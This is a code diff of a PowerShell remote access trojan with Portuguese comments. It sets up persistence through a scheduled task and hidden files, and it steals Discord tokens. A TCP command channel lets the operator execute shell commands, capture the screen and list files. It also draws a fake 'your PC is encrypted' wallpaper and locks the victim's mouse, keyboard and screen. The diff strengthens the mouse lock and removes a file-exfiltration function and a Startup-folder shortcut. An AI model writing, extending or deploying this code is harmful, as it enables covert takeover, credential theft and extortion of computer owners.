@@ -163,19 +163,6 @@ function Install-Persistence {
             Write-DebugLog "Erro ao criar tarefa agendada: $_"
         }
         
-        try {
-            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-            $shortcutPath = "$startupPath\$installName.lnk"
-            $WScriptShell = New-Object -ComObject WScript.Shell
-            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
-            $shortcut.TargetPath = "powershell.exe"
-            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
-            $shortcut.Save()
-            Write-DebugLog "Atalho adicionado à pasta de inicialização"
-        } catch {
-            Write-DebugLog "Erro ao criar atalho: $_"
-        }
-        
         attrib +h +s +r $scriptPath
         Write-DebugLog "Persistência instalada com sucesso"
     } catch {
@@ -219,18 +206,13 @@ function Create-HackWallpaper {
         Write-DebugLog "CRIANDO WALLPAPER HACKEADO"
         Write-DebugLog "=" * 60
         
-        # Dimensões
         $width = 1920
         $height = 1080
-        
-        # Criar bitmap
         $bitmap = New-Object System.Drawing.Bitmap $width, $height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         
-        # Fundo preto
         $graphics.Clear([System.Drawing.Color]::Black)
         
-        # Configurar fontes
         $fontGrande = New-Object System.Drawing.Font("Arial Black", 60, [System.Drawing.FontStyle]::Bold)
         $fontMedio = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
         $fontPequeno = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
@@ -239,26 +221,20 @@ function Create-HackWallpaper {
         $brushBranco = [System.Drawing.Brushes]::White
         $brushAmarelo = [System.Drawing.Brushes]::Orange
         
-        # Desenhar linhas
         $graphics.DrawString("VOCE FOI", $fontGrande, $brushVermelho, 200, 100)
         $graphics.DrawString("HACKEADO!", $fontGrande, $brushVermelho, 200, 180)
-        
         $graphics.DrawString("SEU PC TA", $fontMedio, $brushBranco, 200, 300)
         $graphics.DrawString("CRIPTOGRAFADO!", $fontMedio, $brushBranco, 200, 370)
-        
         $graphics.DrawString("CRYPTO-LOCKED", $fontMedio, $brushAmarelo, 200, 470)
-        
         $graphics.DrawString("ANLGUUR", $fontPequeno, $brushBranco, 200, 570)
         $graphics.DrawString("NOTTI GANG", $fontGrande, $brushVermelho, 200, 650)
         
-        # Adicionar bordas
         $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::Red, 5)
         $graphics.DrawRectangle($pen, 50, 50, $width - 100, $height - 100)
         $pen.Width = 2
         $pen.Color = [System.Drawing.Color]::White
         $graphics.DrawRectangle($pen, 70, 70, $width - 140, $height - 140)
         
-        # Salvar imagem
         $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
         $graphics.Dispose()
         $bitmap.Dispose()
@@ -274,15 +250,12 @@ function Create-HackWallpaper {
 # ===== FUNÇÃO PARA ALTERAR WALLPAPER =====
 function Set-Wallpaper {
     try {
-        Write-DebugLog "Aplicando wallpaper no sistema"
-        
         $code = @'
 using System;
 using System.Runtime.InteropServices;
 public class Wallpaper {
     [DllImport("user32.dll", CharSet = CharSet.Auto)]
     public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-    
     public static void Set(string path) {
         SystemParametersInfo(20, 0, path, 0x01 | 0x02);
     }
@@ -290,70 +263,146 @@ public class Wallpaper {
 '@
         Add-Type -TypeDefinition $code -ErrorAction Stop
         [Wallpaper]::Set($wallpaperPath)
-        
-        Write-DebugLog "Wallpaper aplicado com sucesso"
         return $true
     } catch {
-        Write-DebugLog "Erro ao aplicar wallpaper: $_"
         return $false
     }
 }
 
-# ===== FUNÇÃO WALLPAPER VIA URL (FALLBACK) =====
-function Set-WallpaperFromUrl {
-    param([string]$ImageUrl)
-    
+# ===== TRAVAR MOUSE (VERSÃO AGRESSIVA - CANTO ESQUERDO) =====
+$script:mouseLocked = $false
+$script:mouseThread = $null
+$script:mouseThread2 = $null
+
+function Lock-Mouse {
     try {
+        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
+        
         Write-DebugLog "=" * 60
-        Write-DebugLog "BAIXANDO IMAGEM: $ImageUrl"
+        Write-DebugLog "TRAVANDO MOUSE NO CANTO ESQUERDO"
         Write-DebugLog "=" * 60
         
-        $webClient = New-Object System.Net.WebClient
-        $tempFile = "$env:TEMP\wallpaper_download.jpg"
-        $webClient.DownloadFile($ImageUrl, $tempFile)
-        $webClient.Dispose()
+        $script:mouseLocked = $true
         
-        if (-not (Test-Path $tempFile)) {
-            return "WALLPAPER_DOWNLOAD_ERROR"
-        }
-        
-        $img = [System.Drawing.Image]::FromFile($tempFile)
-        $img.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
-        $img.Dispose()
-        Remove-Item $tempFile -Force
-        
-        $code = @'
+        # CAMADA 1: ClipCursor (API nativa - trava em área de 1 pixel)
+        try {
+            $cSharpCode = @'
 using System;
 using System.Runtime.InteropServices;
-public class Wallpaper {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-    public static void Set(string path) {
-        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
+using System.Windows.Forms;
+public class MouseTrap {
+    [DllImport("user32.dll")]
+    public static extern bool ClipCursor(ref RECT lpRect);
+    
+    [DllImport("user32.dll")]
+    public static extern bool SetCursorPos(int x, int y);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct RECT {
+        public int left, top, right, bottom;
+    }
+    
+    public static void Lock() {
+        RECT rect = new RECT();
+        rect.left = 0;
+        rect.top = 0;
+        rect.right = 1;
+        rect.bottom = 1;
+        ClipCursor(ref rect);
+        SetCursorPos(0, 0);
+    }
+    
+    public static void Unlock() {
+        RECT rect = new RECT();
+        rect.left = 0;
+        rect.top = 0;
+        rect.right = Screen.PrimaryScreen.Bounds.Width;
+        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
+        ClipCursor(ref rect);
     }
 }
 '@
-        Add-Type -TypeDefinition $code -ErrorAction Stop
-        [Wallpaper]::Set($wallpaperPath)
+            Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
+            [MouseTrap]::Lock()
+            Write-DebugLog "✓ ClipCursor aplicado (área de 1 pixel)"
+        } catch {
+            Write-DebugLog "✗ ClipCursor falhou: $_"
+        }
         
-        return "WALLPAPER_SET_FROM_URL"
+        # CAMADA 2: Thread ultra-rápida (1ms)
+        $script:mouseThread = [System.Threading.Thread]::new({
+            while ($script:mouseLocked) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 1
+                } catch {}
+            }
+        })
+        $script:mouseThread.IsBackground = $true
+        $script:mouseThread.Start()
+        Write-DebugLog "✓ Thread rápida iniciada (1ms)"
+        
+        # CAMADA 3: Thread de reforço (10ms - para garantir)
+        $script:mouseThread2 = [System.Threading.Thread]::new({
+            while ($script:mouseLocked) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 10
+                } catch {}
+            }
+        })
+        $script:mouseThread2.IsBackground = $true
+        $script:mouseThread2.Start()
+        Write-DebugLog "✓ Thread de reforço iniciada"
+        
+        Write-DebugLog "=" * 60
+        Write-DebugLog "MOUSE TRAVADO COM SUCESSO"
+        Write-DebugLog "=" * 60
+        
+        return "MOUSE_LOCKED"
     } catch {
-        Write-DebugLog "ERRO ao alterar wallpaper: $_"
-        return "WALLPAPER_ERROR"
+        Write-DebugLog "ERRO ao travar mouse: $_"
+        return "MOUSE_ERROR"
     }
 }
 
-# ===== MOUSE =====
-function Move-Mouse { 
-    param($x, $y)
+function Unlock-Mouse {
     try {
-        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
-        return "OK"
-    } catch { 
-        return "MOUSE_ERROR" 
+        Write-DebugLog "=" * 60
+        Write-DebugLog "LIBERANDO MOUSE"
+        Write-DebugLog "=" * 60
+        
+        $script:mouseLocked = $false
+        
+        # Liberar ClipCursor
+        try {
+            [MouseTrap]::Unlock()
+            Write-DebugLog "✓ ClipCursor liberado"
+        } catch {}
+        
+        # Parar threads
+        if ($script:mouseThread -and $script:mouseThread.IsAlive) {
+            $script:mouseThread.Abort()
+            Write-DebugLog "✓ Thread rápida abortada"
+        }
+        
+        if ($script:mouseThread2 -and $script:mouseThread2.IsAlive) {
+            $script:mouseThread2.Abort()
+            Write-DebugLog "✓ Thread de reforço abortada"
+        }
+        
+        Write-DebugLog "=" * 60
+        Write-DebugLog "MOUSE LIBERADO"
+        Write-DebugLog "=" * 60
+        
+        return "MOUSE_UNLOCKED"
+    } catch {
+        Write-DebugLog "ERRO ao liberar mouse: $_"
+        return "MOUSE_UNLOCK_ERROR"
     }
 }
 
+# ===== DEMAIS FUNÇÕES =====
 function Click-Mouse {
     try {
         [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
@@ -372,7 +421,6 @@ function RightClick-Mouse {
     }
 }
 
-# ===== TECLADO =====
 function Send-Key {
     param($key)
     try {
@@ -393,7 +441,6 @@ function Send-Text {
     }
 }
 
-# ===== ARQUIVOS =====
 function Get-FileList {
     param($Path)
     try {
@@ -409,20 +456,6 @@ function Get-FileList {
     }
 }
 
-function Download-File {
-    param($Path)
-    try {
-        if (Test-Path $Path) {
-            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
-            return "FILE:$content"
-        }
-        return "FILE_NOT_FOUND"
-    } catch { 
-        return "DOWNLOAD_ERROR" 
-    }
-}
-
-# ===== COMANDOS =====
 function Execute-Command {
     param($Cmd)
     try {
@@ -433,7 +466,6 @@ function Execute-Command {
     }
 }
 
-# ===== DISCORD TOKEN =====
 function Get-DiscordToken {
     try {
         $tokens = @()
@@ -460,7 +492,6 @@ function Get-DiscordToken {
     }
 }
 
-# ===== PROCESSOS =====
 function Get-ProcessList {
     try {
         $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
@@ -470,7 +501,6 @@ function Get-ProcessList {
     }
 }
 
-# ===== URL =====
 function Open-Url {
     param($url)
     try {
@@ -481,7 +511,6 @@ function Open-Url {
     }
 }
 
-# ===== ENERGIA =====
 function Power-Control {
     param($Action)
     try {
@@ -492,48 +521,6 @@ function Power-Control {
         return "POWER_$Action"
     } catch { 
         return "POWER_ERROR" 
-    }
-}
-
-# ===== FUNÇÕES DE LOCK =====
-
-$script:mouseLocked = $false
-$script:mouseThread = $null
-$script:blackScreenForm = $null
-$script:keyboardHook = $null
-$script:lockActive = $false
-
-function Lock-Mouse {
-    try {
-        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
-        
-        $script:mouseLocked = $true
-        $script:mouseThread = [System.Threading.Thread]::new({
-            while ($script:mouseLocked) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 5
-                } catch {}
-            }
-        })
-        $script:mouseThread.IsBackground = $true
-        $script:mouseThread.Start()
-        
-        return "MOUSE_LOCKED"
-    } catch {
-        return "MOUSE_ERROR"
-    }
-}
-
-function Unlock-Mouse {
-    try {
-        $script:mouseLocked = $false
-        if ($script:mouseThread -and $script:mouseThread.IsAlive) {
-            $script:mouseThread.Abort()
-        }
-        return "MOUSE_UNLOCKED"
-    } catch {
-        return "MOUSE_UNLOCK_ERROR"
     }
 }
 
@@ -632,27 +619,17 @@ function Unlock-Keyboard {
 }
 
 function Lock-Total {
-    try {
-        Lock-Mouse | Out-Null
-        Black-Screen | Out-Null
-        Lock-Keyboard | Out-Null
-        $script:lockActive = $true
-        return "LOCK_TOTAL_ACTIVATED"
-    } catch {
-        return "LOCK_TOTAL_ERROR"
-    }
+    Lock-Mouse | Out-Null
+    Black-Screen | Out-Null
+    Lock-Keyboard | Out-Null
+    return "LOCK_TOTAL_ACTIVATED"
 }
 
 function Unlock-Total {
-    try {
-        Unlock-Mouse | Out-Null
-        Unlock-Screen | Out-Null
-        Unlock-Keyboard | Out-Null
-        $script:lockActive = $false
-        return "LOCK_TOTAL_DEACTIVATED"
-    } catch {
-        return "UNLOCK_TOTAL_ERROR"
-    }
+    Unlock-Mouse | Out-Null
+    Unlock-Screen | Out-Null
+    Unlock-Keyboard | Out-Null
+    return "LOCK_TOTAL_DEACTIVATED"
 }
 
 # ===== CONEXAO PRINCIPAL =====
@@ -665,17 +642,13 @@ while ($true) {
         $writer.AutoFlush = $true
         
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
-        Write-DebugLog "Conectado ao servidor"
         
         while ($client.Connected) {
             $cmd = $reader.ReadLine()
             if ([string]::IsNullOrEmpty($cmd)) { continue }
             
-            Write-DebugLog "Comando recebido: $cmd"
-            
             if ($cmd -eq "screenshot") {
-                $result = Get-ScreenCapture
-                $writer.WriteLine($result)
+                $writer.WriteLine((Get-ScreenCapture))
             } elseif ($cmd -eq "click") {
                 $writer.WriteLine((Click-Mouse))
             } elseif ($cmd -eq "rightclick") {
@@ -715,10 +688,6 @@ while ($true) {
                 } else {
                     $writer.WriteLine("WALLPAPER_ERROR")
                 }
-            } elseif ($cmd -match "^set_wallpaper (.+)$") {
-                $url = $matches[1]
-                $result = Set-WallpaperFromUrl -ImageUrl $url
-                $writer.WriteLine($result)
             } elseif ($cmd -eq "test") {
                 $writer.WriteLine("PONG")
             } elseif ($cmd -eq "exit") {
@@ -731,8 +700,6 @@ while ($true) {
                 $writer.WriteLine((Send-Text $matches[1]))
             } elseif ($cmd -match "^ls (.+)$") {
                 $writer.WriteLine((Get-FileList $matches[1]))
-            } elseif ($cmd -match "^download (.+)$") {
-                $writer.WriteLine((Download-File $matches[1]))
             } elseif ($cmd -match "^exec (.+)$") {
                 $writer.WriteLine((Execute-Command $matches[1]))
             } elseif ($cmd -match "^url (.+)$") {
@@ -740,12 +707,10 @@ while ($true) {
             } elseif ($cmd -match "^remove_user (.+)$") {
                 $writer.WriteLine((Remove-UserFromRAT $matches[1]))
             } else {
-                Write-DebugLog "Comando nao reconhecido: $cmd"
                 $writer.WriteLine("Comando nao reconhecido")
             }
         }
     } catch {
-        Write-DebugLog "Erro na conexao: $_"
         Start-Sleep -Seconds 10
     } finally {
         if ($client) { $client.Close() }
